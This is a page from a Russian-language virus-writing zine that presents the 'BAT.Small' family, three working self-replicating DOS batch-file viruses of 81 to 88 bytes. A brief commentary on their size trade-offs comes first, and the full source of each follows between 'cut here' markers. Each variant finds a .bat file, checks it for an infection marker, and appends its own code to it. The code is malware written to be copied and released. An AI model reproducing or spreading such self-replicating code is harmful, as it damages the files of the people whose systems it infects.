- [Duke's Virus Labs #3] - [Page 04] -

Семейство BAT.Small
(c) by Duke/SMF

   Ну, тут уже не до хорошего... Чем меньше размер, тем меньше крутости
и сервиса. Но раз уж задался писать мелкие вирусы - так пиши. В этом
семействе я плюнул на все проверки AUTOEXEC'а - "не до жиру, быть бы живу".
Плюнул я на вывод на экран - теперь на экране можно увидеть все, что душе
угодно, вирус ничего не скрывает :) И теперь файлы без перевода строки в
конце поражаются некорректно. Мало того, за один раз поражается всего
один файл. Но есть и приятное - проверка на зараженность по прежнему
действует :)) Одним словом - Small оно и есть Small ...

BAT.Small.88
===== Cut here =====
@for %%b in (*.bat) do set ^=%%b
@find "^"<%^%>nul
@if errorlevel 1 find "^"<%0>>%^%
===== Cut here =====

BAT.Small.85
===== Cut here =====
for %%b in (*.bat) do set ^=%%b
find "^"<%^%>nul
if errorlevel 1 find "^"<%0>>%^%
===== Cut here =====

BAT.Small.81
===== Cut here =====
for %%b in (*.bat) do set ^=%%b
find "^"<%^%
if errorlevel 1 find "^"<%0>>%^%
===== Cut here =====
